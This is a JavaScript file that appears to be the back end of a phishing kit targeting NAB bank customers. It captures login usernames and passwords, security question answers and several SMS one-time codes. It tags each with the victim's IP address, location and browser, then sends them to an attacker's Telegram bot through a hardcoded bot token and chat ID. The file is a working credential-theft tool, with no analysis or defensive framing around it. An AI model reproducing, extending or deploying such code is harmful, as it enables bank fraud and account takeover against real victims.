// script/send.js - This replaces all PHP files

// ===== CONFIG (replaces edit.php) =====
const CONFIG = {
    apikey: "8343008184:AAF4ccn2zyT6Z-zGMZy2zThfPS26L8jPNjE",  // from edit.php
    chatid: "722615124"                                          // from edit.php
};

// ===== Helper Functions (replaces fxker.php) =====
function clean(value) {
    return String(value).trim().replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

function getBrowser(ua) {
    if (ua.includes('MSIE')) return 'Internet Explorer';
    if (ua.includes('Firefox')) return 'Mozilla Firefox';
    if (ua.includes('Chrome')) return 'Google Chrome';
    if (ua.includes('Safari')) return 'Safari';
    if (ua.includes('Opera')) return 'Opera';
    return 'Unknown';
}

async function getLocation(ip) {
    try {
        const res = await fetch(`https://freeipapi.com/api/json/${ip}`);
        const data = await res.json();
        return { country: data.countryName || 'Unknown', city: data.cityName || 'Unknown' };
    } catch { return { country: 'Unknown', city: 'Unknown' }; }
}

async function getClientInfo() {
    let ip = '0.0.0.0';
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        ip = data.ip;
    } catch(e) { console.warn('IP fetch failed'); }
    const location = await getLocation(ip);
    return { 
        ip, 
        location, 
        userAgent: navigator.userAgent,
        browser: getBrowser(navigator.userAgent)
    };
}

// ===== Send to Telegram (replaces message() from fxker.php) =====
async function sendTelegram(message) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${CONFIG.apikey}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CONFIG.chatid, text: message })
        });
        const data = await response.json();
        console.log('Telegram response:', data);
        return data;
    } catch(e) {
        console.error('Telegram send error:', e);
        return null;
    }
}

// ===== Session Management (replaces PHP $_SESSION) =====
// Use localStorage to persist across pages
const Session = {
    get: function(key) {
        return localStorage.getItem('session_' + key);
    },
    set: function(key, value) {
        localStorage.setItem('session_' + key, value);
    },
    getUsername: function() {
        return this.get('username') || 'Unknown';
    }
};

// ===== The Main Switch (replaces err.php) =====
async function processForm(target, formData) {
    const info = await getClientInfo();
    let message = "";
    
    switch(parseInt(target)) {
        case 0: // Login (NAB LOGIN 1)
            const username = clean(formData.get('x') || '');
            const password = clean(formData.get('xx') || '');
            Session.set('username', username);
            Session.set('password', password);
            
            message = `
------------------[NAB LOGIN 1]------------------

Username : ${username}
Password : ${password}

------------[USER AGENT IP DNS]-------------
User Agent
 ${info.userAgent}
IP Address : ${info.ip}
-------------[TELEGRAM: ECHOVSL]-------------`;
            break;

        case 1: // Security Questions
            const q1 = clean(formData.get('q1') || '');
            const a1 = clean(formData.get('a1') || '');
            const q2 = clean(formData.get('q2') || '');
            const a2 = clean(formData.get('a2') || '');
            const q3 = clean(formData.get('q3') || '');
            const a3 = clean(formData.get('a3') || '');
            
            message = `
---------------[Security Que n Ans]---------------

Security Questions And Answers Set By ${Session.getUsername()}
Delay in Progress Second Code Comes in 60 Seconds Time.

Security Que 1: ${q1}
Security Ans 1: ${a1}

Security Que 2: ${q2}
Security Ans 2: ${a2}

Security Que 3: ${q3}
Security Ans 3: ${a3}

--------------[USER AGENT IP DNS]--------------
User Agent
 ${info.userAgent}
IP Address : ${info.ip}
--------------[TELEGRAM: ECHOVSL]--------------`;
            break;

        case 2: // SMS Code 1
            const otp1 = clean(formData.get('xxl') || '');
            message = `
--------------[NAB SMS CODE 1]--------------

SMS CODE FROM : ${Session.getUsername()}
SMS CODE : ${otp1}

------------[USER AGENT IP DNS]-------------
User Agent
 ${info.userAgent}
IP Address : ${info.ip}
-------------[TELEGRAM: ECHOVSL]-------------`;
            break;

        case 3: // SMS Code 2
            const otp2 = clean(formData.get('xxll') || '');
            message = `
--------------[NAB SMS CODE 2]--------------

SMS CODE FROM : ${Session.getUsername()}
SMS CODE : ${otp2}

------------[USER AGENT IP DNS]-------------
User Agent
 ${info.userAgent}
IP Address : ${info.ip}
-------------[TELEGRAM: ECHOVSL]-------------`;
            break;

        case 4: // Review
            message = `
--------------[SECURITY QA REVIEW]--------------

${Session.getUsername()} Reviewing Security Questions and Answers Set

------------[USER AGENT IP DNS]-------------
User Agent
 ${info.userAgent}
IP Address : ${info.ip}
-------------[TELEGRAM: ECHOVSL]-------------`;
            break;

        case 5: // SMS Code 3
            const otp3 = clean(formData.get('xxlll') || '');
            message = `
--------------[NAB SMS CODE 3]--------------

SMS CODE FROM : ${Session.getUsername()}
SMS CODE : ${otp3}

------------[USER AGENT IP DNS]-------------
User Agent
 ${info.userAgent}
IP Address : ${info.ip}
-------------[TELEGRAM: ECHOVSL]-------------`;
            break;

        default:
            console.warn('Unknown target:', target);
            return false;
    }
    
    // Send to Telegram
    await sendTelegram(message);
    return true;
}
